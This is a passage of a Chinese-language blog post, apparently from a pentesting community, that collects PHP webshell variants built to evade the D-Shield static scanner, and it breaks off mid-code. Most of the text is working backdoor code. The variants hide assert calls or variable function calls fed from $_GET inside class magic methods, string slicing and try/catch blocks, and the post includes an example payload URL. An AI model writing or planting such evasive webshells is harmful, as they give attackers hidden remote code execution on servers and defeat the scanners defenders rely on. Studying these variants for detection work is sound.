## 前言
看了很多师傅关于webshell的文章，可谓是各式各样，字符的，汉字的，混淆的，不可打印的，难免让我心痒痒也想来试一试，以d盾2.1.6.2扫不出来为目标
说道php，大部分的webshell（小马）归根到最后都是希望能够实现代码（或命令）执行，无外乎就离不开eval和assert，所以这篇文章也是以此为核心，提供一些绕过的思路。（抛砖引玉~）
## 字符串函数（与类的结合）
  * 关于字符串函数，尝试了很多，核心在于利用字符串函数进行各种错综复杂的拼接，然后实现可变函数调用，实现代码执行
  * 但是d盾对于拼接和可变函数的识别是比较有效的
  * 比如：之前在p师傅博客看的这种
  * 确实够绕够混淆，但是放在d盾面前直接爆红了
  * 所以直接赤裸裸的用 **可变函数** 这条思路可以暂且放下了
  * 那么用字符串函数处理一下简单的放到函数里面效果如何
  * 好像也是不行，那放到类里面会如何呢？
    class A{
        public function test($name){
            $temp = substr($name,6);
            $name = substr($name,0,6);
            $name($temp);
        }
    }
    $obj = new A();
    $obj->test($_GET[1]);
  * payload=shell.php?0=assertphpinfo();
  * 看来真应了那句话， **没有什么是加一层解决不了的，如果有，那就再加一层** ，本文下面的很多尝试都有或多或少基于这句话，在混淆静态扫描很有效果。
## 类与魔术方法
既然可以用类写，那是不是可以把类里魔术方法都试验一遍
### 构造和析构方法
    class A{
        private $name;
        public function __construct($name)
        {
            $this->name = $name;
            $temp = substr($name,6);
            $name = substr($name,0,6);
            $name($temp);
        }
    }
    $obj = new A($_GET[1]);
    ## 析构方法
    class B{
        private $name;
        public function __construct($name)
        {
            $this->name = $name;
        }
        public function __destruct()
        {
            $temp = substr($this->name,6);
            $name = substr($this->name,0,6);
            $name($temp);
        }
    }
    $obj = new B($_GET[1]);
### get和set方法
    ## set方法
    class Demo{
        public function __set($name, $value)
        {
            $temp = substr($name,6);
            $name = substr($name,0,6);
            $name($temp);
        }
    }
    $obj = new Demo();
    $obj->$_GET[1]='占位的';
    ## get方法
    class Demo{
        public function __get($name)
        {
            $temp = substr($name,6);
            $name = substr($name,0,6);
            $name($temp);
        }
    }
    $obj = new Demo();
    echo $obj->$_GET[1];
  * 整体看会发现get和set方法也是比较简单的，比较省力。而且，这个字符串处理函数确实好用，这也算是增加一层的感觉（后面也有相关案例）
### 其他魔术方法
其他魔术方法都可以沿用这种方式，与此雷同，我就把代码直接放过来，不多解释了，大家可以在此基础更多发挥
    ## toString方法
    class Demo
    {
        private $name;
        public function __construct($name)
        {
            $this->name = $name;
        }
        public function __toString()
        {
            $temp = substr($this->name,6);
            $name = substr($this->name,0,6);
            $name($temp);
            return '占位';
        }
    }
    $obj = new Demo($_GET[1]);
    echo $obj;
    ## clone方法
    class Demo
    {
        private $name;
        public function __construct($name)
        {
            $this->name = $name;
        }
        public function __clone()
        {
            $temp = substr($this->name,6);
            $name = substr($this->name,0,6);
            $name($temp);
        }
    }
    $obj = new Demo($_GET[1]);
    $obj2 = clone $obj;
    ## call方法
    class Demo
    {
        public function __call($name,$args)
        {
            $name($args[0]);
        }
    }
    $obj = new Demo();
    $obj->$_GET[0]($_GET[1]);
    ## callStatic方法（最简单）
    class Demo{
        public static function __callStatic($name, $arguments)
        {
            $name($arguments[0]);
        }
    }
    Demo::$_GET[0]($_GET[1]);
    ## isset方法
    class Demo{
        public function __isset($name){
            $temp = substr($name,6);
            $name = substr($name,0,6);
            $name($temp);
        }
    }
    $obj = new Demo();
    isset($obj->$_GET[0]);
    ## unset方法
    class Demo{
        public function __unset($name){
            $temp = substr($name,6);
            $name = substr($name,0,6);
            $name($temp);
        }
    }
    $obj = new Demo();
    unset($obj->$_GET[0]);
可以看出来，能够传参的魔术方法最简单，而d盾都是扫不出来的，只能说php语法过于灵活，诸如`Demo::$_GET[0]($_GET[1])`或者是`$obj->$_GET[0]($_GET[1])`这种形式的语法结构，正则匹配也是很难去推测的。
## 代码结构与包含（php7可用）
从上个板块的试探中已经看出了一些端倪，那就是可以通过不同的代码结构进行嵌套，而绕过扫描，那我们就来进行下一步的试探。
### try...catch...
  * 简单包在函数里
        function say($name){
      try{
          $temp = substr($name,6);
          $name = substr($name,0,6);
          $name($temp);
      }catch (Exception $e){
          var_dump($e);
      }
    }
    say($_GET[1]);
这样就解决的文章开头部分无法在函数里出现的问题
  * 包含类里面（php7可用）  
因为php7之后，assert已经作为语言构造器的方式出现，也就是说不可以向可变函数那样，通过拼接执行，所以必须要直面这个问题。以下这个方法可以直接用assert，而实现绕过。
    class A{
        private $name;
        public function __construct($name)
        {
            $this->name = $name;
        }
        public function __destruct()
        {
            try{
                assert($this->name);
            }catch (Exception $e){
                $e->getMessage();
            } finally {
                echo 'suibian';
            }
        }
    }
    new A($_GET[1]);
可以看出，多加个一层，就扫不出来了，`try...catch...`的结构很灵活，还可以在catch，finally的代码块里写。
    ## 写到catch里
    class A{
        public function __destruct()
        {
            try{
                throw new ErrorException($_GET[1]);
            }catch (Exception $e){
                assert($e->getMessage());
            } finally {
                echo 'suibian';
            }
        }
    }
    new A();
    ## 写到finally里
    class A{
        public function __destruct()
        {
            try{
                $this->a = $_GET[1];